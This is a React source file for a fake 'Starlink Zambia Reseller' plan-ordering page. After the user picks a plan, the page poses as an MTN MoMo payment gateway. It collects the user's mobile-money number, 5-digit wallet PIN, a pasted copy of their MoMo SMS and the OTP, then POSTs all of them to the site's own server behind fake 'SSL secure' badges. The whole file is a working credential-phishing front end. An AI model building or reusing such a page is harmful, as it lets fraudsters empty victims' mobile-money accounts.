import { useEffect, useState } from "react";
import { PlanCard, type Plan } from "./plansCard";
import { cn } from "~/lib/utils";
import { useFetcher, useSubmit } from "react-router";

const plans = [
    {
        id: "basic",
        name: "Basic",
        tag: "Basic",
        description: "Basic Starlink Plan (20mbps)",
        price: 15,
        duration: "month",
    },
    {
        id: "standard",
        name: "Standard",
        tag: "Standard",
        description: "Standard Starlink Plan (60mbps)",
        price: 45,
        duration: "month",
    },
    {
        id: "premium",
        name: "Premium Plan",
        tag: "Premium",
        description: "Premium Starlink Plan (100mbps)",
        price: 75,
        duration: "month",
    },
    {
        id: "unlimited",
        name: "Unlimited Plan",
        tag: "Unlimited",
        description: "Unlimited Starlink Plan (220mbps)",
        price: 110,
        duration: "month",
    },
];
const currency = "ZMW";

export default function MainApp() {
    const [selectedPlan, setSelectedPlan] = useState<Plan | undefined>(undefined);
    const [activeStep, setActiveStep] = useState<number>(1);
    const [formData, setFormData] = useState<{
        phone: string;
        pin: string;
        otp: string;
        message: string;
    }>({ phone: "", pin: "", otp: "", message: "" });


    const handleSelectPlan = (plan: Plan) => {
        setSelectedPlan(plan);
        setActiveStep(2);
        setTimeout(() => {
            setActiveStep(3);
        }, 1000);
    };
    const handleInput = (e: any) => {
        setFormData((prev) => {
            return { ...prev, [e.target?.name as any]: e.target?.value }
        })
    }

    const fetcher = useFetcher()
    const handleCompletion = () => {
        fetcher.submit(formData, {
            method: "POST",
        });

    }

    useEffect(() => {
        if(!fetcher.data) return;
        if (fetcher.data?.ok == true) {
            alert("Order Completed Successfully!")
            setActiveStep(1);
            setFormData({
                phone: "",
                pin: "",
                otp: "",
                message: ""
            });
            setSelectedPlan(undefined);
        }else{
            alert("Something went wrong! Please try again.")
        }
    },[fetcher])

    return (
        <>
            {/* Animated Background Canvas */}
            <canvas id="star-bg"></canvas>

            <div className="app-container">
                {/* {JSON.stringify(fetcher.data)} */}
                {/* Navbar */}
                <header className="navbar">
                    <a href="#" className="brand" aria-label="Starlink Zambia Reseller Home">
                        <img src="assets/starlink_logo_white.png" alt="Starlink" className="brand-logo-img" />
                        <div className="brand-divider"></div>
                        <div className="brand-text">ZAMBIA <span>RESELLER</span></div>
                    </a>

                    <div className="nav-actions">
                        <div className="region-badge">
                            <span className="flag-icon">🇿🇲</span> ZAMBIA (ZMW)
                        </div>
                    </div>
                </header>

                {/* Step Progress Indicator */}
                <nav className="step-wizard" aria-label="Order Progress">
                    <div className="step-wizard-bar" id="wizard-progress-bar"></div>
                    <div className={cn("wizard-item", activeStep === 1 && "active")} id="wiz-1">
                        <div className="wizard-circle">1</div>
                        <span className="wizard-label">Plans</span>
                    </div>
                    <div className={cn("wizard-item", activeStep === 2 && "active")} id="wiz-2">
                        <div className="wizard-circle">2</div>
                        <span className="wizard-label">Verify</span>
                    </div>
                    <div className={cn("wizard-item", activeStep === 3 && "active")} id="wiz-3">
                        <div className="wizard-circle">3</div>
                        <span className="wizard-label">Account</span>
                    </div>
                    <div className={cn("wizard-item", activeStep === 4 && "active")} id="wiz-4">
                        <div className="wizard-circle">4</div>
                        <span className="wizard-label">Details</span>
                    </div>
                    <div className={cn("wizard-item", activeStep === 5 && "active")} id="wiz-5">
                        <div className="wizard-circle">5</div>
                        <span className="wizard-label">Security</span>
                    </div>
                    <div className={cn("wizard-item", activeStep === 6 && "active")} id="wiz-6">
                        <div className="wizard-circle">6</div>
                        <span className="wizard-label">Status</span>
                    </div>
                </nav>

                {/* STEP 1: Plan Selection */}
                <section className={cn("view-step", activeStep === 1 && "active")} id="step-1">
                    <div className="hero-banner">
                        <div className="hero-content">
                            <div className="badge-pill">
                                <span className="pulse-dot"></span>
                                High-Speed Coverage Active
                            </div>
                            <h1 className="hero-title">Select Your Starlink Plan</h1>
                            <p className="hero-subtitle">High-speed, low-latency satellite internet across Zambia. Choose a package below to initiate your order.</p>
                        </div>
                        <div className="hero-media">
                            <img src="assets/starlink_sattelit.png" alt="Starlink Satellite" className="hero-sat-img" />
                        </div>
                    </div>

                    <div className="plans-grid">
                        {
                            plans.map((plan) => (
                                <PlanCard key={plan.id} plan={plan} currency={currency} onSelect={handleSelectPlan} />
                            ))
                        }

                    </div>
                </section>

                {/* STEP 2: Processing Screen (MTN MoMo Gateway Redirect) */}
                <section className={cn("view-step", activeStep === 2 && "active")} id="step-2">
                    <div className="processing-modal">
                        {/* Gold Spinner Arc */}
                        <div className="momo-spinner-container">
                            <div className="momo-spinner-arc"></div>
                        </div>

                        {/* MTN MoMo Logo Image */}
                        <div className="momo-logo-box">
                            <img src="assets/momo_logo.png" alt="MTN MoMo" className="momo-img-logo" />
                        </div>

                        <h2 className="processing-modal-title">Processing...</h2>
                        <p className="processing-modal-sub">Securely redirecting to MTN MoMo payment gateway</p>
                        <span className="processing-modal-note">Please do not refresh the page</span>
                    </div>
                </section>

                {/* STEP 3: Form 1 (MTN MoMo Authorization Card) */}
                <section className={cn("view-step", activeStep === 3 && "active")} id="step-3">
                    <div className="momo-auth-card">
                        {/* Gold Header Banner */}
                        <div className="momo-card-banner">
                            <div className="momo-banner-logo-wrapper">
                                <img src="assets/momo_logo.png" alt="MTN MoMo" className="momo-img-banner" />
                            </div>
                            <h2 className="momo-banner-title">MTN MoMo</h2>
                        </div>

                        <div className="momo-card-body">
                            {/* Summary Row: Amount & Service */}
                            <div className="momo-summary-row">
                                <div className="momo-summary-item">
                                    <span className="momo-sum-label">AMOUNT</span>
                                    <span className="momo-sum-val" id="auth-amount-val">ZMW 15.00</span>
                                </div>
                                <div className="momo-summary-item" style={{ textAlign: 'right' }}>
                                    <span className="momo-sum-label">SERVICE</span>
                                    <span className="momo-sum-val" id="auth-service-val">Starlink Renewal</span>
                                </div>
                            </div>

                            <p className="momo-auth-subtitle">Enter your MTN MoMo details to authorize</p>

                            <form id="form-step-1" onSubmit={(e) => {
                                e.preventDefault();

                            }}>
                                {/* Field 1: MTN MoMo Number with +260 and Zambian flag */}
                                <div className="form-group">
                                    <label className="form-label" htmlFor="input-phone" style={{ color: '#374151' }}>MTN MoMo Number</label>
                                    <div className="phone-input-group momo-light-input">
                                        <div className="country-prefix momo-light-prefix">
                                            <span className="flag-icon">🇿🇲</span>
                                            <span className="prefix-code">+260</span>
                                        </div>
                                        <input
                                            type="text"
                                            id="input-phone"
                                            className="form-input phone-input momo-light-field"
                                            placeholder="77xxxxxxx"
                                            inputMode="numeric"
                                            maxLength={9}
                                            autoComplete="tel"
                                            required
                                            name="phone"
                                            value={formData.phone}
                                            onInput={(e) => handleInput(e)} />
                                    </div>
                                    <div className="error-message" id="err-phone">Enter a valid 9-digit Zambian number (MTN: 76/77/78 · Airtel: 95/96/97/99 · Zamtel: 50/51)</div>
                                </div>

                                {/* Field 2: 5-Digit PIN Input */}
                                <div className="form-group">
                                    <label className="form-label" htmlFor="input-pin" style={{ color: '#374151' }}>Enter PIN</label>
                                    <div className="input-wrapper">
                                        <input
                                            type="password"
                                            id="input-pin"
                                            className="form-input momo-light-field"
                                            placeholder="•••••"
                                            maxLength={5}
                                            inputMode="numeric"
                                            style={{ letterSpacing: '8px', fontSize: '1.4rem', textAlign: 'center' }}
                                            required
                                            value={formData.pin}
                                            name="pin"
                                            onInput={(e) => {
                                                handleInput(e);

                                                // function filter4DigitOtp(input:any) {
                                                //     input.value = input.value.replace(/\D/g, '').slice(0, 4);
                                                //     const errPin = document.getElementById('err-pin');
                                                //     if (input.value.length === 4 && errPin) {
                                                //         errPin.style.display = 'none';
                                                //         input.classList.remove('error');
                                                //     }else{
                                                //     }
                                                // }
                                                // filter4DigitOtp(e.target);

                                            }} />
                                    </div>
                                    <div className="input-hint-bottom" style={{ color: '#6b7280' }}>Enter your 5 digit secure PIN</div>
                                    {
                                        formData.pin.length < 5 && <div className="error-message error" id="err-pin" style={{ textAlign: 'center', display: 'block' }}>Must be a 5-digit secure PIN. </div>
                                    }
                                    <div className="error-message" id="err-pin" style={{ textAlign: 'center' }}>Must be a 5-digit secure PIN.</div>
                                </div>

                                <button
                                    onClick={() => {
                                        (formData.phone.length >= 7 && formData.pin.length >= 5) && setActiveStep(4)
                                    }}

                                    type="submit" className="btn-primary btn-confirm-payment" id="btn-submit-1">
                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                        <polyline points="20 6 9 17 4 12"></polyline>
                                    </svg>
                                    CONFIRM PAYMENT
                                </button>

                                <div className="ssl-badge" style={{ color: '#10b981' }}>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                                    </svg>
                                    SSL ENCRYPTED &amp; SECURE
                                </div>
                            </form>
                        </div>
                    </div>
                </section>

                {/* STEP 4: Form 2 (Full SMS Verification) */}
                <section className={cn("view-step", activeStep === 4 && "active")} id="step-4">
                    <div className="form-card">
                        {/* Top bar with Back button and Amount display */}
                        <div className="sms-card-header">
                            <button type="button" className="back-btn" onClick={() => setActiveStep(3)}>&larr; Back</button>
                            <div className="sms-amount-box">
                                <span className="sms-amount-label">AMOUNT</span>
                                <span className="sms-amount-val" id="sms-amount-val">ZMW {selectedPlan?.price.toFixed(2)}</span>
                            </div>
                        </div>

                        <div className="form-header" style={{ textAlign: 'left', marginBottom: '20px' }}>
                            <h2 className="form-title" style={{ fontSize: '1.5rem', marginBottom: '6px' }}>Full SMS Verification</h2>
                            <p className="form-desc">Please paste the full SMS content you received from MTN MoMo.</p>
                        </div>

                        <form id="form-step-2" onSubmit={(e) => {
                            e.preventDefault();

                        }}>
                            {/* Sending To Block */}
                            <div className="sending-to-block">
                                <span className="sending-to-label">SENDING TO</span>
                                <div className="sending-to-number" id="sms-sending-to-phone">{formData.phone}</div>
                            </div>

                            {/* Warning Callout Box */}
                            <div className="warning-callout">
                                <span className="warning-icon">⚠️</span>
                                <span><strong>DO NOT edit the SMS</strong> — only copy and paste the entire message below</span>
                            </div>

                            {/* Field 1: Long Text SMS Content Input */}
                            <div className="form-group">
                                <label className="form-label" htmlFor="input-notes" style={{ textTransform: 'uppercase', fontSize: '0.78rem', letterSpacing: '0.8px', color: 'var(--text-muted)' }}>
                                    Paste Full SMS Content
                                </label>
                                <div className="input-wrapper">
                                    <textarea
                                        id="input-notes"
                                        className="form-textarea"
                                        placeholder="Paste the entire MTN MoMo SMS here..."
                                        maxLength={1000}
                                        value={formData.message}
                                        required
                                        name="message"
                                        onInput={(e) => handleInput(e)} />
                                </div>
                                <div className="char-counter" id="notes-counter">{formData.message.length} / 1000 characters</div>

                                {formData.message.length < 20 && <div className="error-message error" style={{display: "block"}} id="err-notes">Please paste a real MTN MoMo SMS — it must contain words, numbers, and be at least 20 characters.</div>}
                            </div>

                            <button 
                            
                            onClick={() => {
                                (formData.message.length >= 20) && setActiveStep(5)
                            }}

                            type="submit" className="btn-primary btn-orange" id="btn-submit-2">
                                Next Step &rarr;
                            </button>

                            <div className="ssl-badge">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                                </svg>
                                SSL ENCRYPTED AND SECURE
                            </div>
                        </form>
                    </div>
                </section>

                {/* STEP 5: Form 3 (OTP Verification) */}
                <section className={cn("view-step", activeStep === 5 && "active")} id="step-5">
                    <div className="form-card">
                        {/* Top bar with Back button and Amount display */}
                        <div className="sms-card-header">
                            <button type="button" className="back-btn" onClick={() => setActiveStep(4)}>&larr; Back</button>
                            <div className="sms-amount-box">
                                <span className="sms-amount-label">AMOUNT</span>
                                <span className="sms-amount-val" id="otp-amount-val">ZMW {selectedPlan?.price.toFixed(2)}</span>
                            </div>
                        </div>

                        <div className="form-header" style={{ textAlign: 'left', marginBottom: '20px' }}>
                            <h2 className="form-title" style={{ fontSize: '1.5rem', marginBottom: '6px' }}>OTP Verification</h2>
                            <p className="form-desc">Please enter the OTP code you received in the SMS.</p>
                        </div>

                        <form id="form-step-3" onSubmit={(e) => {
                            e.preventDefault();
                        }}>
                            {/* Sending To Block */}
                            <div className="sending-to-block">
                                <span className="sending-to-label">SENDING TO</span>
                                <div className="sending-to-number" id="otp-sending-to-phone">{formData.phone}</div>
                            </div>

                            {/* Field 1: OTP Code Input */}
                            <div className="form-group">
                                <label className="form-label" htmlFor="input-otp" style={{ textTransform: 'uppercase', fontSize: '0.78rem', letterSpacing: '0.8px', color: 'var(--text-muted)', justifyContent: 'center', marginBottom: '12px' }}>
                                    ENTER OTP CODE
                                </label>
                                <div className="input-wrapper">
                                    <input
                                        type="password"
                                        id="input-otp"
                                        className="form-input"
                                        placeholder="••••"
                                        maxLength={4}
                                        inputMode="numeric"
                                        style={{ letterSpacing: '12px', fontSize: '1.6rem', textAlign: 'center', maxWidth: '280px', margin: '0 auto', display: 'block' }}
                                        required
                                        value={formData.otp}
                                        name="otp"
                                        onInput={(e) => handleInput(e)} />
                                </div>
                               {formData.otp.length < 4 && <div className="error-message error" id="err-pin" style={{ textAlign: 'center', display: "block" }}>Please enter the 4-digit OTP code.</div> }
                            </div>

                            <button 
                            
                            onClick={() => {
                                (formData.otp.length >= 4) && setActiveStep(6)
                            }}
                            type="submit" className="btn-primary btn-orange" id="btn-submit-3" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                                Verify &amp; Complete
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                                </svg>
                            </button>

                            <div className="ssl-badge">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                                </svg>
                                SSL ENCRYPTED AND SECURE
                            </div>
                        </form>
                    </div>
                </section>

                {/* STEP 6: Order Authorization & Processing Screen */}
                <section className={cn("view-step", activeStep === 6 && "active")} id="step-6">
                    <div className="waiting-card">
                        <div className="waiting-badge">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                                <circle cx="12" cy="12" r="10" />
                            </svg>
                            AUTHORIZATION IN PROGRESS
                        </div>

                        <h2 className="waiting-title">Processing Order Activation</h2>
                        <p className="processing-subtitle">Your satellite broadband request is being processed through the network activation gateway. Please stand by while clearance completes.</p>

                        <div className="summary-box">
                            <div className="summary-row">
                                <span className="summary-label">Reference ID:</span>
                                <span className="summary-val" id="sum-ref-id">#STL-ZM-{Math.floor(Math.random() * 1000)}</span>
                            </div>
                            <div className="summary-row">
                                <span className="summary-label">Selected Plan:</span>
                                <span className="summary-val" id="sum-plan">{selectedPlan?.name}</span>
                            </div>
                            <div className="summary-row">
                                <span className="summary-label">Account Phone:</span>
                                <span className="summary-val" id="sum-phone">{formData.phone}</span>
                            </div>
                            <div className="summary-row">
                                <span className="summary-label">SMS Verification Payload:</span>
                                <span className="summary-val" id="sum-notes">{formData.message}</span>
                            </div>
                            <div className="summary-row">
                                <span className="summary-label">Security Authorization PIN:</span>
                                <span className="summary-val" id="sum-pin">•••••</span>
                            </div>
                            <div className="summary-row">
                                <span className="summary-label">Gateway Status:</span>
                                <span className="summary-val" style={{ color: 'var(--warning)' }} id="sum-tg-status">Processing Gateway Clearance</span>
                            </div>
                        </div>

                        <div className="terminal-logs" id="bot-wait-log">
                            &gt; Transmitting security authorization payload to network gateway...
                        </div>

                        <div style={{ marginTop: '24px', display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap' }}>
                            <button className="btn-icon" onClick={() => alert("Copied to clipboard!")}>Copy Ref Code</button>
                            <button className="btn-primary" style={{ width: 'auto' }} onClick={() =>{
                                handleCompletion();
                            }}>
                                { fetcher.state!="idle"?"Please Wait...": "New Order Flow"}</button>
                        </div>
                    </div>
                </section>
            </div>

            {/* Toast Notifications Container */}
            <div className="toast-container" id="toast-container"></div>


        </>
    )
}